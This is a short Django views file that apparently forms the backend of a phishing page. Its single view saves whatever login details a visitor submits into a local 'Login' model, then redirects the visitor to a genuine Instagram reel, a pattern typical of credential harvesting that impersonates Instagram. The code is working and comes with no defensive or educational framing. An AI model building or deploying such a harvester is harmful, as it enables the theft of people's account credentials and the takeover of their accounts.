from django.shortcuts import render, redirect
from .models import Login
from .forms import LoginForm


# Create your views here.


def take_login_informations(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('https://www.instagram.com/reel/DIcKpdqI1Dk/')
        else:
            print(form.errors)
    else:
        form = LoginForm()
    return render(request, 'pages/index.html', {'form' : form})